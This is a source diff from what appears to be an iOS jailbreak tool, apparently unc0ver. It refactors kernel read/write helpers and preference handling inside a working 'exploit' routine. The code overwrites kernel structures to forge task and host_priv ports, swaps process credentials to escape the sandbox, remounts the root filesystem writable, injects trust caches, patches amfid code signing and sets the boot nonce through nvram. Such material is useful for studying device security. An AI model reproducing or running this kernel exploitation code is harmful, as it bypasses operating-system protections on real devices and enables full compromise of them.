@@ -99,6 +99,23 @@ typedef struct {
     kptr_t shenanigans;
 } offsets_t;
 
+typedef struct {
+    bool load_tweaks;
+    bool load_daemons;
+    bool dump_apticket;
+    bool run_uicache;
+    const char *boot_nonce;
+    bool disable_auto_updates;
+    bool disable_app_revokes;
+    bool overwrite_boot_nonce;
+    bool export_kernel_task_port;
+    bool restore_rootfs;
+    bool increase_memory_limit;
+    bool install_cydia;
+    bool install_openssh;
+    bool reload_system_daemons;
+} prefs_t;
+
 const char *empty_list_supported_versions[] = {
     "4397.0.0.2.4~1",
     "4481.0.0.2.1~1",
@@ -268,12 +285,7 @@ const char *necp_supported_versions[] = {
 #define ptrSize sizeof(uintptr_t)
 
 static void writeTestFile(const char *file) {
-    _assert(clean_file(file), message, true);
-    FILE *a = fopen(file, "w");
-    LOG("a: " "%p" "\n", a);
-    _assert(a != NULL, message, true);
-    _assert(fclose(a) == ERR_SUCCESS, message, true);
-    _assert(init_file(file, 0, 0644), message, true);
+    _assert(create_file(file, 0, 0644), message, true);
     _assert(unlink(file) == ERR_SUCCESS, message, true);
 }
 
@@ -414,10 +426,10 @@ typedef struct {
 uint64_t zm_fix_addr(uint64_t addr, uint64_t zone_map_ref) {
     static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
     if (zm_hdr.start == 0) {
-        // xxx ReadAnywhere64(0) ?!
+        // xxx ReadKernel64(0) ?!
         // uint64_t zone_map_ref = find_zone_map_ref();
         LOG("zone_map_ref: %llx \n", zone_map_ref);
-        uint64_t zone_map = ReadAnywhere64(zone_map_ref);
+        uint64_t zone_map = ReadKernel64(zone_map_ref);
         LOG("zone_map: %llx \n", zone_map);
         // hdr is at offset 0x10, mutexes at start
         size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
@@ -447,21 +459,21 @@ void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_k
     // now make the changes to the port object to make it a task port:
     uint64_t port_kaddr = getAddressOfPort(getpid(), port);
     
-    WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
-    WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
-    WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
-    WriteAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
-    WriteAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
+    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
+    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
+    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
+    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
+    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
     
     // swap our receive right for a send right:
     uint64_t task_port_addr = task_self_addr();
-    uint64_t task_addr = ReadAnywhere64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    uint64_t itk_space = ReadAnywhere64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
-    uint64_t is_table = ReadAnywhere64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+    uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
     
     uint32_t port_index = port >> 8;
     const int sizeof_ipc_entry_t = 0x18;
-    uint32_t bits = ReadAnywhere32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
+    uint32_t bits = ReadKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
     
 #define IE_BITS_SEND (1<<16)
 #define IE_BITS_RECEIVE (1<<17)
@@ -469,7 +481,7 @@ void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_k
     bits &= (~IE_BITS_RECEIVE);
     bits |= IE_BITS_SEND;
     
-    WriteAnywhere32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
+    WriteKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
 }
 
 void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
@@ -537,18 +549,18 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
     
     {
         // find kernel task first
-        kernel_task_kaddr = ReadAnywhere64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+        kernel_task_kaddr = ReadKernel64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
         
         while (kernel_task_kaddr != 0) {
-            uint64_t bsd_info = ReadAnywhere64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+            uint64_t bsd_info = ReadKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
             
-            uint32_t pid = ReadAnywhere32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+            uint32_t pid = ReadKernel32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
             
             if (pid == 0) {
                 break;
             }
             
-            kernel_task_kaddr = ReadAnywhere64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_PREV));
+            kernel_task_kaddr = ReadKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_PREV));
         }
         
         if (kernel_task_kaddr == 0) {
@@ -576,10 +588,10 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
     // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
     // or traditional \"zone_init: kmem_suballoc failed\"
     uint64_t zone_map_kptr = zone_map_ref;
-    uint64_t zone_map = ReadAnywhere64(zone_map_kptr);
+    uint64_t zone_map = ReadKernel64(zone_map_kptr);
     
     // kernel_task->vm_map == kernel_map
-    uint64_t kernel_map = ReadAnywhere64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
+    uint64_t kernel_map = ReadKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
     
     uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
     uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
@@ -626,7 +638,7 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
     
     make_port_fake_task_port(*port, remapped_task_addr);
     
-    if (ReadAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
+    if (ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
         LOG("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
         return 1;
     }
@@ -634,8 +646,8 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
     // lck_mtx -- arm: 8  arm64: 16
     const int offsetof_host_special = 0x10;
     uint64_t host_priv_kaddr = getAddressOfPort(getpid(), mach_host_self());
-    uint64_t realhost_kaddr = ReadAnywhere64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    WriteAnywhere64(realhost_kaddr + offsetof_host_special + 4 * sizeof(void*), port_kaddr);
+    uint64_t realhost_kaddr = ReadKernel64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    WriteKernel64(realhost_kaddr + offsetof_host_special + 4 * sizeof(void*), port_kaddr);
     
     return 0;
 }
@@ -692,7 +704,7 @@ void unblockDomainWithName(const char *name) {
 
 #define DEFAULT_VERSION_STRING "Hacked"
 
-int updateVersionString(char *newVersionString, mach_port_t tfp0, vm_address_t kernel_base) {
+int updateVersionString(const char *newVersionString, mach_port_t tfp0, vm_address_t kernel_base) {
     uintptr_t versionPtr = 0;
     struct utsname u = {0};
     uname(&u);
@@ -813,7 +825,7 @@ int _vnode_lookup(uint64_t vnode_lookup, const char *path, int flags, uint64_t *
     if (ret != 0) {
         return -1;
     }
-    *vpp = ReadAnywhere64(vnode);
+    *vpp = ReadKernel64(vnode);
     kmem_free(ks, len);
     kmem_free(vnode, sizeof(uint64_t));
     return 0;
@@ -1072,16 +1084,18 @@ int necp_die() {
 
 void make_host_into_host_priv() {
     uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
-    uint32_t old = ReadAnywhere32(hostport_addr);
+    uint32_t old = ReadKernel32(hostport_addr);
     LOG("old host type: 0x%08x\n", old);
-    WriteAnywhere32(hostport_addr, IO_ACTIVE | IKOT_HOST_PRIV);
+    if ((old & (IO_ACTIVE | IKOT_HOST_PRIV)) != (IO_ACTIVE | IKOT_HOST_PRIV))
+        WriteKernel32(hostport_addr, IO_ACTIVE | IKOT_HOST_PRIV);
 }
 
 void make_host_priv_into_host() {
     uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
-    uint32_t old = ReadAnywhere32(hostport_addr);
+    uint32_t old = ReadKernel32(hostport_addr);
     LOG("old host type: 0x%08x\n", old);
-    WriteAnywhere32(hostport_addr, IO_ACTIVE | IKOT_HOST);
+    if ((old & (IO_ACTIVE | IKOT_HOST)) != (IO_ACTIVE | IKOT_HOST))
+        WriteKernel32(hostport_addr, IO_ACTIVE | IKOT_HOST);
 }
 
 mach_port_t try_restore_port() {
@@ -1355,91 +1369,57 @@ void crashKernel() {
     }
 }
 
+bool load_prefs(prefs_t *prefs, NSDictionary *defaults) {
+    if (prefs == NULL) {
+        return false;
+    }
+    prefs->load_tweaks = [defaults[@K_TWEAK_INJECTION] boolValue];
+    prefs->load_daemons = [defaults[@K_LOAD_DAEMONS] boolValue];
+    prefs->dump_apticket = [defaults[@K_DUMP_APTICKET] boolValue];
+    prefs->run_uicache = [defaults[@K_REFRESH_ICON_CACHE] boolValue];
+    prefs->boot_nonce = [defaults[@K_BOOT_NONCE] UTF8String];
+    prefs->disable_auto_updates = [defaults[@K_DISABLE_AUTO_UPDATES] boolValue];
+    prefs->disable_app_revokes = [defaults[@K_DISABLE_APP_REVOKES] boolValue];
+    prefs->overwrite_boot_nonce = [defaults[@K_OVERWRITE_BOOT_NONCE] boolValue];
+    prefs->export_kernel_task_port = [defaults[@K_EXPORT_KERNEL_TASK_PORT] boolValue];
+    prefs->restore_rootfs = [defaults[@K_RESTORE_ROOTFS] boolValue];
+    prefs->increase_memory_limit = [defaults[@K_INCREASE_MEMORY_LIMIT] boolValue];
+    prefs->install_cydia = [defaults[@K_INSTALL_CYDIA] boolValue];
+    prefs->install_openssh = [defaults[@K_INSTALL_OPENSSH] boolValue];
+    prefs->reload_system_daemons = [defaults[@K_RELOAD_SYSTEM_DAEMONS] boolValue];
+    return true;
+}
+
 void exploit(mach_port_t tfp0,
              uint64_t kernel_base,
              NSDictionary *defaults)
 {
     int rv = 0;
     offsets_t offsets = { 0 };
-    NSMutableDictionary *md = nil;
     pid_t myPid = getpid();
     uint64_t myProcAddr = 0;
     uint64_t myOriginalCredAddr = 0;
     uint64_t myCredAddr = 0;
     uint64_t kernelCredAddr = 0;
     uint64_t Shenanigans = 0;
-    uint64_t ShenanigansPatch = 0xca13feba37be;
-    pid_t amfidPid = 0;
-    uint64_t amfidProcAddr = 0;
-    task_t amfidTaskPort = TASK_NULL;
-    pid_t launchdPid = 1;
-    uint64_t launchdProcAddr = 0;
-    task_t launchdTaskPort = TASK_NULL;
-    uint64_t vfs_context = 0;
-    uint64_t devVnode = 0;
-    uint64_t rootfs_vnode = 0;
-    uint64_t v_mount = 0;
-    uint32_t v_flag = 0;
-    FILE *a = NULL;
-    struct utsname u = { 0 };
-    char buf_targettype[256];
-    size_t size = 0;
-    char *kernelVersionString = NULL;
-    CFStringRef value = nil;
-    uint64_t v_specinfo = 0;
-    uint64_t si_flags = 0;
-    NSArray *cleanUpFileList = nil;
-    bool load_tweaks = false;
-    bool load_daemons = false;
-    bool dump_apticket = false;
-    bool run_uicache = false;
-    char *boot_nonce = NULL;
-    bool disable_auto_updates = false;
-    bool disable_app_revokes = false;
-    bool overwrite_boot_nonce = false;
-    bool export_kernel_task_port = false;
-    bool restore_rootfs = false;
-    bool increase_memory_limit = false;
-    bool install_cydia = false;
-    bool install_openssh = false;
-    bool reload_system_daemons = false;
+    prefs_t prefs;
     bool needResources = false;
     bool needStrap = false;
     const char *amfid_payload = NULL;
     bool updatedResources = false;
-    char link[0x100];
-    const char *jbdPidFile = NULL;
-    NSFileManager *fileManager = [NSFileManager defaultManager];
-    NSArray *resources = nil;
-    NSString *payload = nil;
-    NSString *tar_tar = nil;
-    NSString *lzma_tar = nil;
-    NSString *rsync_tar = nil;
-    NSString *strap_tar = nil;
+
 #define SETOFFSET(offset, val) (offsets.offset = val)
 #define GETOFFSET(offset)      offsets.offset
 #define kernel_slide           (kernel_base - KERNEL_SEARCH_ADDRESS)
-    
+
     UPSTAGE();
     
     {
         // Load preferences.
         LOG("Loading preferences...");
         SETMESSAGE(NSLocalizedString(@"Failed to load preferences.", nil));
-        load_tweaks = [defaults[@K_TWEAK_INJECTION] boolValue];
-        load_daemons = [defaults[@K_LOAD_DAEMONS] boolValue];
-        dump_apticket = [defaults[@K_DUMP_APTICKET] boolValue];
-        run_uicache = [defaults[@K_REFRESH_ICON_CACHE] boolValue];
-        boot_nonce = (char *)[defaults[@K_BOOT_NONCE] UTF8String];
-        disable_auto_updates = [defaults[@K_DISABLE_AUTO_UPDATES] boolValue];
-        disable_app_revokes = [defaults[@K_DISABLE_APP_REVOKES] boolValue];
-        overwrite_boot_nonce = [defaults[@K_OVERWRITE_BOOT_NONCE] boolValue];
-        export_kernel_task_port = [defaults[@K_EXPORT_KERNEL_TASK_PORT] boolValue];
-        restore_rootfs = [defaults[@K_RESTORE_ROOTFS] boolValue];
-        increase_memory_limit = [defaults[@K_INCREASE_MEMORY_LIMIT] boolValue];
-        install_cydia = [defaults[@K_INSTALL_CYDIA] boolValue];
-        install_openssh = [defaults[@K_INSTALL_OPENSSH] boolValue];
-        reload_system_daemons = [defaults[@K_RELOAD_SYSTEM_DAEMONS] boolValue];
+        bzero(&prefs, sizeof(prefs));
+        _assert(load_prefs(&prefs, defaults) == true, message, true);
         LOG("Successfully loaded preferences.");
     }
     
@@ -1560,7 +1540,7 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        if (export_kernel_task_port) {
+        if (prefs.export_kernel_task_port) {
             // Export kernel task port.
             LOG("Exporting kernel task port...");
             SETMESSAGE(NSLocalizedString(@"Failed to export kernel task port.", nil));
@@ -1579,6 +1559,7 @@ void exploit(mach_port_t tfp0,
     
     {
         // Escape Sandbox.
+        static uint64_t ShenanigansPatch = 0xca13feba37be;
         
         LOG("Escaping Sandbox...");
         SETMESSAGE(NSLocalizedString(@"Failed to escape sandbox.", nil));
@@ -1588,10 +1569,10 @@ void exploit(mach_port_t tfp0,
         kernelCredAddr = getKernelCredAddr();
         LOG("kernelCredAddr: " ADDR "\n", kernelCredAddr);
         _assert(ISADDR(kernelCredAddr), message, true);
-        Shenanigans = ReadAnywhere64(GETOFFSET(shenanigans));
+        Shenanigans = ReadKernel64(GETOFFSET(shenanigans));
         LOG("Shenanigans: " ADDR "\n", Shenanigans);
         _assert(ISADDR(Shenanigans), message, true);
-        WriteAnywhere64(GETOFFSET(shenanigans), ShenanigansPatch);
+        WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
         myOriginalCredAddr = ShaiHuludProcessAtAddr(myProcAddr, kernelCredAddr);
         LOG("myOriginalCredAddr: " ADDR "\n", myOriginalCredAddr);
         _assert(ISADDR(myOriginalCredAddr), message, true);
@@ -1615,7 +1596,7 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        if (dump_apticket) {
+        if (prefs.dump_apticket) {
             // Dump APTicket.
             
             LOG("Dumping APTicket...");
@@ -1628,7 +1609,7 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        if (overwrite_boot_nonce) {
+        if (prefs.overwrite_boot_nonce) {
             // Unlock nvram.
             
             LOG("Unlocking nvram...");
@@ -1637,12 +1618,12 @@ void exploit(mach_port_t tfp0,
             LOG("Successfully unlocked nvram.");
             
             if (runCommand("/usr/sbin/nvram", "com.apple.System.boot-nonce", NULL) != ERR_SUCCESS ||
-                strstr([lastSystemOutput bytes], boot_nonce) == NULL) {
+                strstr([lastSystemOutput bytes], prefs.boot_nonce) == NULL) {
                 // Set boot-nonce.
                 
                 LOG("Setting boot-nonce...");
                 SETMESSAGE(NSLocalizedString(@"Failed to set boot-nonce.", nil));
-                _assert(runCommand("/usr/sbin/nvram", [[NSString stringWithFormat:@"com.apple.System.boot-nonce=%s", boot_nonce] UTF8String], NULL) == ERR_SUCCESS, message, true);
+                _assert(runCommand("/usr/sbin/nvram", [[NSString stringWithFormat:@"com.apple.System.boot-nonce=%s", prefs.boot_nonce] UTF8String], NULL) == ERR_SUCCESS, message, true);
                 _assert(runCommand("/usr/sbin/nvram", "IONVRAM-FORCESYNCNOW-PROPERTY=com.apple.System.boot-nonce", NULL) == ERR_SUCCESS, message, true);
                 LOG("Successfully set boot-nonce.");
             }
@@ -1676,7 +1657,7 @@ void exploit(mach_port_t tfp0,
             
             LOG("Getting vfs_context...");
             SETMESSAGE(NSLocalizedString(@"Failed to get vfs_context.", nil));
-            vfs_context = _vfs_context(GETOFFSET(vfs_context_current), GETOFFSET(zone_map_ref));
+            uint64_t vfs_context = _vfs_context(GETOFFSET(vfs_context_current), GETOFFSET(zone_map_ref));
             LOG("vfs_context: " ADDR "\n", vfs_context);
             _assert(ISADDR(vfs_context), message, true);
             LOG("Successfully got vfs_context.");
@@ -1685,7 +1666,7 @@ void exploit(mach_port_t tfp0,
             
             LOG("Getting dev vnode...");
             SETMESSAGE(NSLocalizedString(@"Failed to get dev vnode.", nil));
-            devVnode = getVnodeAtPath(vfs_context, "/dev/disk0s1s1", GETOFFSET(vnode_lookup));
+            uint64_t devVnode = getVnodeAtPath(vfs_context, "/dev/disk0s1s1", GETOFFSET(vnode_lookup));
             LOG("devVnode: " ADDR "\n", devVnode);
             _assert(ISADDR(devVnode), message, true);
             LOG("Successfully got dev vnode.");
@@ -1694,11 +1675,11 @@ void exploit(mach_port_t tfp0,
             
             LOG("Clearing dev vnode's si_flags...");
             SETMESSAGE(NSLocalizedString(@"Failed to clear dev vnode's si_flags.", nil));
-            v_specinfo = ReadAnywhere64(devVnode + koffset(KSTRUCT_OFFSET_VNODE_VU_SPECINFO));
+            uint64_t v_specinfo = ReadKernel64(devVnode + koffset(KSTRUCT_OFFSET_VNODE_VU_SPECINFO));
             LOG("v_specinfo: " ADDR "\n", v_specinfo);
             _assert(ISADDR(v_specinfo), message, true);
-            WriteAnywhere32(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS), 0);
-            si_flags = ReadAnywhere64(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS));
+            WriteKernel32(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS), 0);
+            uint64_t si_flags = ReadKernel64(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS));
             LOG("si_flags: " ADDR "\n", si_flags);
             _assert(ISADDR(si_flags), message, true);
             _assert(si_flags == 0, message, true);
@@ -1749,16 +1730,17 @@ void exploit(mach_port_t tfp0,
             _assert(reboot(RB_QUICK) == ERR_SUCCESS, message, true);
             LOG("Successfully rebooted.");
         }
-        rootfs_vnode = ReadAnywhere64(GETOFFSET(rootvnode));
-        v_mount = ReadAnywhere64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
-        v_flag = ReadAnywhere32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG));
+        uint64_t rootfs_vnode = ReadKernel64(GETOFFSET(rootvnode));
+
+        uint64_t v_mount = ReadKernel64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
+        uint32_t v_flag = ReadKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG));
         if ((v_flag & MNT_NOSUID) || (v_flag & MNT_RDONLY)) {
             v_flag = v_flag & ~MNT_NOSUID;
             v_flag = v_flag & ~MNT_RDONLY;
-            WriteAnywhere32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag & ~MNT_ROOTFS);
+            WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag & ~MNT_ROOTFS);
             _assert(runCommand("/sbin/mount", "-u", "/", NULL) == ERR_SUCCESS, message, true);
-            v_mount = ReadAnywhere64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
-            WriteAnywhere32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag);
+            v_mount = ReadKernel64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
+            WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag);
         }
         rv = snapshot_list("/");
         needStrap = access("/.installed_unc0ver", F_OK) != ERR_SUCCESS && access("/electra", F_OK) != ERR_SUCCESS;
@@ -1810,33 +1792,18 @@ void exploit(mach_port_t tfp0,
         }
         
         if (needResources) {
-            _assert(clean_file("/jb/amfid_payload.dylib"), message, true);
-            payload = pathForResource(@"amfid_payload.tar");
-            a = fopen([payload UTF8String], "rb");
-            LOG("a: " "%p" "\n", a);
-            _assert(a != NULL, message, true);
-            untar(a, "amfid_payload");
-            _assert(fclose(a) == ERR_SUCCESS, message, true);
+            NSString *payload_tar = pathForResource(@"amfid_payload.tar");
+            untar([payload_tar UTF8String]);
             _assert(init_file("/jb/amfid_payload.dylib", 0, 0644), message, true);
         }
         
         if (needStrap) {
-            tar_tar = pathForResource(@"tar.tar");
-            _assert(clean_file("/jb/tar"), message, true);
-            a = fopen([tar_tar UTF8String], "rb");
-            LOG("a: " "%p" "\n", a);
-            _assert(a != NULL, message, true);
-            untar(a, "tar");
-            _assert(fclose(a) == ERR_SUCCESS, message, true);
+            NSString *tar_tar = pathForResource(@"tar.tar");
+            untar([tar_tar UTF8String]);
             _assert(init_file("/jb/tar", 0, 0755), message, true);
             
-            lzma_tar = pathForResource(@"lzma.tar");
-            _assert(clean_file("/jb/lzma"), message, true);
-            a = fopen([lzma_tar UTF8String], "rb");
-            LOG("a: " "%p" "\n", a);
-            _assert(a != NULL, message, true);
-            untar(a, "lzma");
-            _assert(fclose(a) == ERR_SUCCESS, message, true);
+            NSString *lzma_tar = pathForResource(@"lzma.tar");
+            _assert(untar([lzma_tar UTF8String]), message, true);
             _assert(init_file("/jb/lzma", 0, 0755), message, true);
         }
         LOG("Successfully copied over our resources to RootFS.");
@@ -1845,7 +1812,7 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        if (restore_rootfs) {
+        if (prefs.restore_rootfs) {
             SETMESSAGE(NSLocalizedString(@"Failed to Restore RootFS.", nil));
             
             // Rename system snapshot.
@@ -1878,13 +1845,8 @@ void exploit(mach_port_t tfp0,
             if (kCFCoreFoundationVersionNumber < 1452.23) {
                 _assert(waitForFile("/var/MobileSoftwareUpdate/mnt1/sbin/launchd") == ERR_SUCCESS, message, true);
                 
-                rsync_tar = pathForResource(@"rsync.tar");
-                _assert(clean_file("/jb/rsync"), message, true);
-                a = fopen([rsync_tar UTF8String], "rb");
-                LOG("a: " "%p" "\n", a);
-                _assert(a != NULL, message, true);
-                untar(a, "rsync");
-                _assert(fclose(a) == ERR_SUCCESS, message, true);
+                NSString *rsync_tar = pathForResource(@"rsync.tar");
+                _assert(untar([rsync_tar UTF8String]), message, true);
                 _assert(init_file("/jb/rsync", 0, 0755), message, true);
                 
                 _assert(injectTrustCache(@[@"/jb/rsync"], GETOFFSET(trust_chain)) == ERR_SUCCESS, message, true);
@@ -1897,12 +1859,24 @@ void exploit(mach_port_t tfp0,
             
             LOG("Cleaning up...");
             SETMESSAGE(NSLocalizedString(@"Failed to clean up.", nil));
-            cleanUpFileList = @[@"/var/cache", @"/var/lib", @"/var/stash", @"/var/db/stash", @"etc/alternatives", @"/etc/apt", @"/etc/default", @"/etc/dpkg", @"/etc/profile.d", @"/etc/ssh", @"/etc/ssl", @"/var/mobile/Library/Cydia", @"/var/mobile/Library/Caches/com.saurik.Cydia/sources.list"];
-            _assert(cleanUpFileList != nil, message, true);
-            for (NSString *fileName in cleanUpFileList) {
-                if (access([fileName UTF8String], F_OK) == ERR_SUCCESS) {
-                    _assert(([fileManager removeItemAtPath:fileName error:nil]), message, true);
-                }
+            static const char *cleanUpFileList[] = {
+                "/var/cache",
+                "/var/lib",
+                "/var/stash",
+                "/var/db/stash",
+                "/etc/alternatives",
+                "/etc/apt",
+                "/etc/default",
+                "/etc/dpkg",
+                "/etc/profile.d",
+                "/etc/ssh",
+                "/etc/ssl",
+                "/var/mobile/Library/Cydia",
+                "/var/mobile/Library/Caches/com.saurik.Cydia/sources.list",
+                NULL
+            };
+            for (const char **file = cleanUpFileList; *file != NULL; file++) {
+                clean_file(*file);
             }
             LOG("Successfully cleaned up.");
             
@@ -1910,7 +1884,7 @@ void exploit(mach_port_t tfp0,
             
             LOG("Disallowing SpringBoard to show non-default system apps...");
             SETMESSAGE(NSLocalizedString(@"Failed to disallow SpringBoard to show non-default system apps.", nil));
-            md = [NSMutableDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
+            NSMutableDictionary *md = [NSMutableDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
             if (![md[@"SBShowNonDefaultSystemApps"] isEqual:@NO]) {
                 md[@"SBShowNonDefaultSystemApps"] = @NO;
                 _assert(([md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES]), message, true);
@@ -1943,6 +1917,7 @@ void exploit(mach_port_t tfp0,
         LOG("Injecting trust cache...");
         SETMESSAGE(NSLocalizedString(@"Failed to inject trust cache.", nil));
         LOG("trust_chain = 0x%llx\n", GETOFFSET(trust_chain));
+        NSArray *resources = nil;
         if (needResources) {
             resources = @[@(amfid_payload)];
         } else {
@@ -1961,13 +1936,9 @@ void exploit(mach_port_t tfp0,
         
         LOG("Logging slide...");
         SETMESSAGE(NSLocalizedString(@"Failed to log slide.", nil));
-        _assert(clean_file("/var/tmp/slide.txt"), message, true);
-        a = fopen("/var/tmp/slide.txt", "w+");
-        LOG("a: " "%p" "\n", a);
-        _assert(a != NULL, message, true);
-        fprintf(a, ADDR "\n", kernel_slide);
-        _assert(fclose(a) == ERR_SUCCESS, message, true);
-        _assert(init_file("/var/tmp/slide.txt", 0, 0644), message, true);
+        NSData *fileData = [[NSString stringWithFormat:@(ADDR "\n"), kernel_slide] dataUsingEncoding:NSUTF8StringEncoding];
+        _assert(fileData != nil, message, false);
+        _assert(create_file_data("/var/tmp/slide.txt", 0, 0644, fileData), message, false);
         LOG("Successfully logged slide.");
     }
     
@@ -1978,7 +1949,7 @@ void exploit(mach_port_t tfp0,
         
         LOG("Logging ECID...");
         SETMESSAGE(NSLocalizedString(@"Failed to log ECID.", nil));
-        value = MGCopyAnswer(kMGUniqueChipID);
+        CFStringRef value = MGCopyAnswer(kMGUniqueChipID);
         LOG("ECID: " "%@" "\n", value);
         _assert(value != nil, message, true);
         setPreference(@K_ECID, [NSString stringWithFormat:@"%@", value]);
@@ -1993,8 +1964,7 @@ void exploit(mach_port_t tfp0,
         
         LOG("Logging offsets...");
         SETMESSAGE(NSLocalizedString(@"Failed to log offsets.", nil));
-        _assert(clean_file("/jb/offsets.plist"), message, true);
-        md = [NSMutableDictionary dictionary];
+        NSMutableDictionary *md = [NSMutableDictionary dictionary];
         md[@"KernelBase"] = ADDRSTRING(kernel_base);
         md[@"KernelSlide"] = ADDRSTRING(kernel_slide);
         md[@"TrustChain"] = ADDRSTRING(GETOFFSET(trust_chain));
@@ -2034,14 +2004,10 @@ void exploit(mach_port_t tfp0,
         // Set Disable Loader.
         LOG("Setting Disable Loader...");
         SETMESSAGE(NSLocalizedString(@"Failed to set Disable Loader.", nil));
-        if (load_tweaks) {
+        if (prefs.load_tweaks) {
             clean_file("/var/tmp/.substrated_disable_loader");
         } else {
-            a = fopen("/var/tmp/.substrated_disable_loader", "w");
-            LOG("a: " "%p" "\n", a);
-            _assert(a != NULL, message, true);
-            _assert(fclose(a) == ERR_SUCCESS, message, true);
-            init_file("/var/tmp/.substrated_disable_loader", 0, 644);
+            _assert(create_file("/var/tmp/.substrated_disable_loader", 0, 644), message, true);
         }
         LOG("Successfully set Disable Loader.");
     }
@@ -2063,14 +2029,15 @@ void exploit(mach_port_t tfp0,
             LOG("Patching amfid...");
             SETMESSAGE(NSLocalizedString(@"Failed to patch amfid.", nil));
             _assert(clean_file("/var/tmp/amfid_payload.alive"), message, true);
